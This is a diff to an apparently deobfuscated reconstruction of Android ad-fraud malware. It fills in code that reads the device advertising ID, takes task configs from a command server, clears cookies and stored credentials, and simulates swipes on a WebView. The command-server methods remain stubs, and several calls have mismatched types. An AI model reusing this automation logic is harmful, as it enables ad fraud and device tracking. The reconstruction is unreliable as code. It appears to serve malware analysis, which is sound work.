@@ -691,7 +691,7 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
         this.pageStartTime = 0L;
         this.elapsedTime = 0L;
         this.loadedUrls = new HashSet<>();
-        this.screenSize = null; /* new Size(0, 0) - custom type */
+        this.screenSize = new Size(0, 0); /* IlIIlllllI1.llllIIIIll1(0, 0) */
         this.currentSwipe = null;
         this.pendingLogs = Collections.synchronizedList(new ArrayList<>());
         this.pendingEvents = Collections.synchronizedList(new ArrayList<>());
@@ -710,7 +710,8 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
          * TaskConfig.fromJson(jsonConfig.getJSONObject("offer"))
          * Original: llIIIIlIlllIII1.llllIIIIll1(jSONObject.getJSONObject("offer"))
          */
-        this.taskConfig = null; /* TaskConfig.fromJson(jsonConfig.getJSONObject("offer")) */
+        this.taskConfig = TaskConfig.fromJson(jsonConfig.getJSONObject("offer"));
+        /* Original: llIIIIlIlllIII1.llllIIIIll1(jSONObject.getJSONObject("offer")) */
 
         /*
          * Check if request interception is enabled via the "sdk_iframe_access" config key.
@@ -868,9 +869,12 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
     public String getGAID() {
         /*
          * Original: IlIlllIIlI1.lIIIIlllllIlll1.lIIIIlllllIlll1().getGaId()
-         * Retrieves the GAID from the app's context/advertising ID provider.
+         *           != null ? llllllIlIIIlll1.llllIIIIll1.llllIIIIll1().getGaId() : ""
+         * Retrieves the GAID from the app's Atom (device fingerprint) object.
+         * Two different accessor paths to the same GAID value.
          */
-        return ""; /* Simplified — original checks if GAID is non-null and returns it or "" */
+        String gaId = AppContext.getAtom().getGaId();
+        return gaId != null ? gaId : "";
     }
 
     /**
@@ -1120,8 +1124,8 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
         PackageInfo currentWebViewPackage;
 
         /* Determine screen dimensions for coordinate calculations */
-        /* Original: this.screenSize = ScreenHelper.getScreenSize(AppContext.getContext()) */
-        this.screenSize = null; /* ScreenHelper.getScreenSize(AppContext.getContext()) */
+        /* Original: IlIlIIIlIlIlll1.lIllIIIlIl1.llllIIIIll1(IlIlllIIlI1.lIIIIlllllIlll1.llllIllIl1()) */
+        this.screenSize = ScreenHelper.getScreenSize(AppContext.getContext());
 
         /* Report the offer ID to an analytics/tracking system if not empty */
         if (!getOfferId().isEmpty()) {
@@ -1248,8 +1252,9 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
             CookieManager.getInstance().flush();
 
             /* Clear HTTP authentication credentials */
+            /* Original: IlIlllIIlI1.lIIIIlllllIlll1.f248llllIIIIll1.IllIIlIIII1() */
             WebViewDatabase.getInstance(
-                    null /* originally: AppContext.getContext().getApplicationContext() */
+                    AppContext.taskConfig.getContext()
             ).clearHttpAuthUsernamePassword();
 
             /* Delete all WebStorage (localStorage, sessionStorage, etc.) */
@@ -1271,10 +1276,10 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
             /*
              * Record the "last_show_time" in shared preferences.
              * This is used by the malware to track when ads were last shown.
-             * Original: WebViewHelper.putString(context, "last_show_time", String.valueOf(new Date().getTime()))
+             * Original: IIlIllIIll1.lIIIIlllllIlll1(IlIlllIIlI1.lIIIIlllllIlll1.llllIllIl1(), "last_show_time", ...)
              */
-            /* WebViewHelper.putString(AppContext.getContext(), "last_show_time",
-                    String.valueOf(new Date().getTime())); */
+            PreferencesHelper.putString(AppContext.getContext(), "last_show_time",
+                    String.valueOf(new Date().getTime()));
             this.isFirstRun = false;
         }
 
@@ -1312,8 +1317,9 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
 
             /* Build the local file path: "sdk/<filename>" */
             String localPath = "sdk/" + filename;
+            /* Original: IlIlllIIlI1.lIIIIlllllIlll1.llllIllIl1().getFilesDir() */
             File file = new File(
-                    null /* originally: AppContext.getContext().getFilesDir() */,
+                    AppContext.getContext().getFilesDir(),
                     localPath);
 
             if (file.exists() && file.isFile()) {
@@ -1405,18 +1411,19 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
      * @return true if the swipe was started, false if another swipe is in progress
      */
     public final boolean startSwipe(PointF startPoint, PointF endPoint, long duration) {
-        Object /* SwipeSimulator */ existingSwipe = this.currentSwipe;
-        if (existingSwipe != null /* && existingSwipe.isRunning() */) {
+        SwipeSimulator existingSwipe = (SwipeSimulator) this.currentSwipe;
+        if (existingSwipe != null && existingSwipe.isRunning()) {
             Log.d(TAG, "swipe already in progress, ignoring new swipe request");
             return false;
         }
 
         /*
          * Create a new SwipeSimulator and start it on a background thread.
-         * Original: new SwipeSimulator(this.webView, startPoint, endPoint, duration)
+         * Original: new lIllIlIll1.lIIIIlllllIlll1(this.f508llllIIIIll1, pointF, pointF2, j)
          */
-        this.currentSwipe = null; /* new SwipeSimulator(this.webView, startPoint, endPoint, duration) */
-        /* new Thread((Runnable) this.currentSwipe).start(); */
+        SwipeSimulator swipe = new SwipeSimulator(this.webView, startPoint, endPoint, duration);
+        this.currentSwipe = swipe;
+        new Thread(swipe).start();
         return true;
     }
 
@@ -1429,9 +1436,12 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
      * Contains API key, offer ID, and target URL for the current ad-fraud task.
      */
     interface TaskConfig {
+        static TaskConfig fromJson(JSONObject json) { return null; } /* originally llIIIIlIlllIII1.llllIIIIll1(json) */
         String getApiKey();     /* originally lIIIIlllllIlll1() */
         String getOfferId();    /* originally llllIIIIll1() */
         String getTargetUrl();  /* originally llllIllIl1() */
+        Object getContext();    /* originally IllIIlIIII1() — returns app Context */
+        Object getSignalingConnection(); /* originally IlIlllIIlI1() */
     }
 
     /**
@@ -1440,26 +1450,20 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
      * and completion notification.
      */
     static class ApiClient {
-        static void reportEvents(String apiKey, String offerId, List<String> events) {
-            /* C&C API: POST events to server */
-        }
-        static void uploadLogs(String apiKey, String offerId, List<String> logs) {
-            /* C&C API: POST logs to server */
-        }
-        static void reportDone(String apiKey, String offerId, String result) {
-            /* C&C API: POST task completion to server */
-        }
+        static void reportEvents(String apiKey, String offerId, List<String> events)
+                throws Exception { /* C&C API: POST events to server */ }
+        static void uploadLogs(String apiKey, String offerId, List<String> logs)
+                throws Exception { /* C&C API: POST logs to server */ }
+        static void reportDone(String apiKey, String offerId, String result)
+                throws Exception { /* C&C API: POST task completion to server */ }
     }
 
     /**
      * Placeholder for the MainThreadHandler (originally IlIlllIIlI1.lIIIIlllllIlll1).
-     * Posts Runnables to the main/UI thread for WebView operations that must
-     * be performed on the UI thread.
+     * Posts Runnables to the main/UI thread for WebView operations.
      */
     static class MainThreadHandler {
-        static void post(Runnable runnable) {
-            /* Posts runnable to the main thread handler */
-        }
+        static void post(Runnable runnable) { /* Posts runnable to the main thread handler */ }
     }
 
     /**
@@ -1467,9 +1471,38 @@ public abstract class WebViewAutomationBase implements WebViewBridge /* lIllIlIl
      * Determines whether request interception is ready/active.
      */
     static class RequestFilter {
-        static boolean isReady() {
-            /* Returns true when the ad blocker/request filter is initialized */
-            return false;
-        }
+        static boolean isReady() { return false; }
+    }
+
+    /**
+     * Placeholder for AppContext (originally IlIlllIIlI1.lIIIIlllllIlll1).
+     * Provides application-wide context and state.
+     */
+    static class AppContext {
+        static Object /* Context */ getContext() { return null; }
+        static Object /* Atom */ getAtom() { return null; }   /* originally lIIIIlllllIlll1() */
+        static TaskConfig taskConfig;
+    }
+
+    /**
+     * Placeholder for ScreenHelper (originally IlIlIIIlIlIlll1.lIllIIIlIl1).
+     */
+    static class ScreenHelper {
+        static Object /* Size */ getScreenSize(Object context) { return null; }
+    }
+
+    /**
+     * Placeholder for PreferencesHelper (originally IlIlIIIlIlIlll1.IIlIllIIll1).
+     */
+    static class PreferencesHelper {
+        static void putString(Object context, String key, String value) { }
+    }
+
+    /**
+     * Placeholder for custom Size type (originally IlIIlllllI1.llllIIIIll1).
+     */
+    static class Size {
+        int width, height;
+        Size(int w, int h) { this.width = w; this.height = h; }
     }
 }
